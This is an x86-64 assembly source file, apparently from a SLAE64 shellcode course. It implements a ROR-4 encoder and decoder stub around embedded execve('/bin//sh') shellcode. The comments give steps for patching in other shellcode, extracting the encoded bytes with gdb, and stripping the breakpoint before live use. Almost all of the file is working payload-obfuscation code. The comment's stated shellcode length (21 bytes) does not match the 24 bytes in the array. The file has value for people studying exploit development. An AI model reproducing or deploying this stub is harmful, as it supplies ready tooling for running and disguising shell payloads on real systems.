bits 64
; Filename: ror.nasm
; Author: Gitsnik SLAE64-1232
; Website:  http://dracyrys.com/
;
; Purpose:
;	Provide two way ror encoding of shellcode bytes.
;
; Strictly speaking, this is both the encoder and decoder
; stubs. Patch in your clean shellcode, compile the file
; get-sh.sh the result and drop it into a -ggdb compiled
; shellcode tester. When you run gdb and hit the
; shellcode defined int 0x03 (character \xcc in the shell
; output), type:
;
; x/21xb $rsi
;
; 21 here being the length of my execve() shellcode, your
; shellcode length will vary.
;
; The resulting bytes are your encoded shellcode. Add them
; to the bottom of the stub and it will encode them just
; as easily.
;
; Notes:
;	Live use of this code for decoding will want to
;	remove the \xcc before deployment.
;

global _start
section .text
_start:
	jmp short caller

encoder:
	xor rcx, rcx
	mul rcx

	pop rsi
	lea rdi, [rsi]

	mov cl, codelen

encode:
	mov bl, byte [rsi + rax]	; Retrieve current byte of shellcode
	ror bl, 4			; Encode/ Decode it
	mov byte [rdi], bl		; Put it back where it belongs

	inc rdi				; Move to the next byte
	inc rax

	dec rcx				; Count down, make sure that we have
	jnz encode			; or have not reached the end of our
					; shellcode

	int 0x03			; debugger interrupt. We do not want
					; to jmp to shellcode during encode
					; so we enter this int to stop gdb
					; and let us dump ESI for our encoded
					; shellcode

	jmp short shellcode

caller:
	call encoder

	shellcode: db 0x6a,0x3b,0x58,0x99,0x48,0xbb,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x73,0x68,0x52,0x53,0x54,0x5f,0x52,0x57,0x54,0x5e,0x0f,0x05
	codelen equ $-shellcode
